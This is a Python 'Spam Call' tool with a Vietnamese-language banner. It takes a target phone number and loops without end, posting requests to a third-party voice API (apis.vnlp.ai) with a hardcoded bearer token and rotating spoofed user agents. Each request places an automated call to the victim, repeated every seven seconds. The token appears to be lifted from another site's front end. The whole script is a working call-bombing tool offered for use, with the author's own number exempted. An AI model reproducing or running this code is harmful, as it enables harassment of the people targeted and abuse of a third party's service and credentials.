 from time import sleep
import os, sys, requests, random, json
from requests import post,get
import time
from random import choice, randint, shuffle
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')
def banner():
 banner = f"""
\033[1;36m     █████   █    ██▓██   ██▓▓█████▄▄▄█████▓
\033[1;39m   ▒██▓  ██▒ ██  ▓██▒▒██  ██▒▓█   ▀▓  ██▒ ▓▒
\033[1;36m   ▒██▒  ██░▓██  ▒██░ ▒██ ██░▒███  ▒ ▓██░ ▒░
\033[1;39m   ░██  █▀ ░▓▓█  ░██░ ░ ▐██▓░▒▓█  ▄░ ▓██▓ ░ 
\033[1;36m   ░▒███▒█▄ ▒▒█████▓  ░ ██▒▓░░▒████▒ ▒██▒ ░ 
\033[1;39m   ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒   ██▒▒▒ ░░ ▒░ ░ ▒ ░░   
\033[1;36m    ░ ▒░  ░ ░░▒░ ░ ░ ▓██ ░▒░  ░ ░  ░   ░    
\033[1;39m      ░   ░  ░░░ ░ ░ ▒ ▒ ░░     ░    ░      
\033[1;36m       ░       ░     ░ ░        ░  ░        
\033[1;39m                     ░ ░
\033[1;39m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\033[1;31mBản Quyền: \033[1;36m Đặng Vi Hữu Đạt 
\033[1;32mMomo: \033[1;33m0776278973
\033[1;39mTool: Spam Call
\033[1;39m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush()
os.system("cls" if os.name == "nt" else "clear")
banner()
print("\033[1;31m[ ! ] Lưu Ý : Có Thể Mở Thêm Tab Spam")
print("\033[1;31m[ ! ] Tool Hiện Tại Chỉ Là Bản Thử Nghiệm Nên Sẽ Còn Lỗi !")
sdt=input(str('\033[1;37m[ \033[1;36m• \033[1;37m] Nhập Số Điện Thoại: '))
if sdt == "0976025901":
	exit("SPAM SỐ TAO ĂN LỒN À!!!!")
print('\033[1;97m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ')
stt=0
while True:
    stt+=1
    ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-G570Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SHT-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; 5044D Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 YaApp_Android/8.90 YaSearchBrowser/8.90","Mozilla/5.0 (Linux; Android 8.0.0; SM-G935U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0.2; LG-D410) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; CPH1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1"]
    soluong = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","40","50","60","70","80","90","99"]
    s = ["1","2","3","4","5","6","7","8","9","0"]
    s1 = ["8","6","1","5","3","9","0","7","2","4"]
    s2 = ["10","20","30","40","50","60","70","80","90","100"]
    keyboard = ["q","w","e","r","t","y","u","i","o","p"]
    keyboard1 = ["a","s","d","f","g","h","j","k","l"]
    keyboard2 = ["z","x","c","v","b","n","m"]
    keyboard3 = ["qa","ws","ed","rf","tg","yh","uj","ik","ol","pp"]
    Hoa = ["Q","Z","W","S","E","D","X","C","R","F","V","T","G","B","Y","H","N","U","J","M","I","K","P","L","O"]
    keyboard4 = ["qz","wx","ec","rv","tb","yn","um","iz","ov","pb"]
    vex = ""
    ag = random.choice(ua)
    sl = random.choice(soluong)
    vex = random.choice(s)
    vex1 = random.choice(s1)
    vex2 = random.choice(s2)
    vi = random.choice(keyboard)
    vi1 = random.choice(keyboard3)
    vi2 = random.choice(Hoa)
    vi3 = random.choice(keyboard1)
    vi4 = random.choice(keyboard2)
    vi5 = random.choice(keyboard4)
    head={"Host": "apis.vnlp.ai","Connection": "keep-alive","Content-Length": "160","Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbklkIjoiOTFjY2M1NDQtNTMxNS00MmY0LThlMTgtMWEzY2Y3NjgwODhmIiwiaWF0IjoxNjQwNzQ1OTg2fQ.SBEyxmJe0jQ_EmR2ngi6pSOi4R-ruNBSoc0AMbbROcU4yqwKLMozpohB0jEvHXvGAtV8a3Y6LWSd337OZec5860ImZBIYErN7dVzTIfgMnUfjLVKESHGq4g0jFddvOqv9eYFVLCwSzWC4KrCpGmzBviBxCIEQv0PqqdzpLYSM2w","Content-Type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","User-Agent": ag,"sec-ch-ua-platform": "\"Android\"","Accept": "*/*","Origin": "https://emandai.net","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://emandai.net/","Accept-Encoding": "gzip, deflate, br"}
    son = json.dumps({"name":"website_"+sl+"_"+vex+vex2+vi+vi1+vex1+vi2+vi3+vi4+vi5,"callees":[sdt],"caller":"842367109722","params":[{"field":"name","value":"Đặng Văn Trưởng"},{"field":"gender","value":"Male"}]})
    string=requests.post("https://apis.vnlp.ai/api/v2/voice/outbound", headers=head, data=son).text
    print(f'\033[1;37m[\033[1;33m{stt}\033[1;37m] Send Call From \033[1;32mSecret \033[1;37mTo Number\033[1;31m {sdt} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
    for a in range(7,0,-1):
        print(f'Tiếp Tục Spam Sau {a}s ', end='\r')
        sleep(1)
